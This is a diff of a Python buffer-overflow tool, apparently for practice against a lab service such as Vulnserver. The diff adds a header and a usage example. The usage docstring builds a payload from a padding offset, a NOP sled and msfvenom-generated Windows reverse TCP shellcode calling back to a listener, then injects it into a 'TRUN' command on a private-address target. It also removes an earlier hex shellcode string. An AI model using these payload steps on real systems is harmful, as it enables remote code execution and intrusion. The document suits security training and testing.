@@ -1,12 +1,36 @@
-#!/usr/bin/python3
+#!/usr/bin/env python
+
+# Bofer - tool for performing Buffer Overflow test on Network exposed applications.
+#
+# JONNYZAR. Copyright (C) 2022 https://github.com/jonnyzar. All rights reserved.
+#
+# This software is provided under MIT LICENCE.
+#
+# Description:
+#   Easy to use out of the box tool to look for buffer overflow entry points and inject shellcode into them.
+#
+# Author:
+#   Yan Zaripov (@jonnyzar)
+#
+
+
 '''
 EXAMPLE usage of Shell code injection
 
-All in HEX:
-offset + vulnerable_address + NOP + shell_code 
+Payload come after the -c key
 
-python3 bofer.py -x 'TRUN /.:/' -n 2003 -c
-'xxxx62909090909090909090909090909090909090909090909090909090909090dbceba2139a92ed97424f45e31c9b15231561783eefc03772a4bdb8ba4092473356eac9604aecad3371e98b1bbd5cc214f9bd846f8163f69f90b03e8795650ca4099a50b84c444595d82fb4deadec7e6a0cf4f1b70f17e8a0aa8a02ddec0e83503eca3cef79a3506c6639967e691e3a0c14996d831f7a11f4b2327bbeba09f670d6479ec01c10daa05d4c2c1325de505b325c2819ffe6b90455093c2250d3189c85a48d084af61ea54b8f2996667a935cbe077c22cdbc05cd3e4307510b060edb1b9eaed3e6cbcbd90df7d6d51b015675eef0688b498ad735f6799439b0fd8b3b2935555de3b30ce77a51984e62ab4e129a03b16e741310490a10c7637bdba1edb2c21de924cfe89f3a3f75fee9aa17df37b89c528b814c4bd8432d67b047f82d353297c920d9bd64ce175be09c945b815043024a7f1055b0896812474066dff3c268cd548cf09bcf092a96b36ab2999c74831e8c215f501bf0690256c26b1' inject 192.168.56.6 9999
+offset=$(python3 -c "print('A'*1000)") 
+
+
+vulnerable_address="ABCCDDEE" #pay attention to Endianess - reverse the address value if its little endian
+
+NOP=$(python3 -c "print('90'*32)") 
+
+shell_code=$(msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.1 LPORT=1337 -a x64 --platform windows -f hex)
+
+payload=$offset$vulnerable_address$NOP$shell_code 
+
+python3 bofer.py -x 'TRUN /.:/' -n 2003 -c $payload inject 192.168.56.6 9999
 
 
 '''
@@ -18,10 +42,10 @@ import argparse
 
 parser = argparse.ArgumentParser()
 
-#mode: spike, fuzz, inject
-#spike: increase buffer rapidly to prove the input is vulnerable
-#fuzz: increase buffer gradually with smaller steps to get more precise BoF location
-#inject: inject exact amount to exactly locate the EIP or overwrite EIP
+#modes: spike, fuzz, inject
+#spike: find vulnerable entry points
+#fuzz: increase buffer gradually with smaller steps to identify BoF location
+#inject: inject payload
 
 parser.add_argument('bofMode', type=str, help='Enter BoF mode: spike, fuzz, inject')
 parser.add_argument('targetIP', type=str)
@@ -30,7 +54,7 @@ parser.add_argument('-s','--step', default=100, type=int)
 parser.add_argument('-x','--suffix', default='', type=str)
 parser.add_argument('-n','--prefill_num', default=0, type=int)
 parser.add_argument('-a','--prefill_ascii', default='', type=str)
-parser.add_argument('-b','--useBadChars', default=0, type=int, help="1: place bad characters after postfix")
+parser.add_argument('-b','--useBadChars', default=0, type=int, help="1: bad character placement; 0: no bad characters")
 parser.add_argument('-c','--ShellCode', default='', type=str, help="Input as is. Example: \"AA BB CC\"")
 
 #postfix usually includes confirmation code or shell code
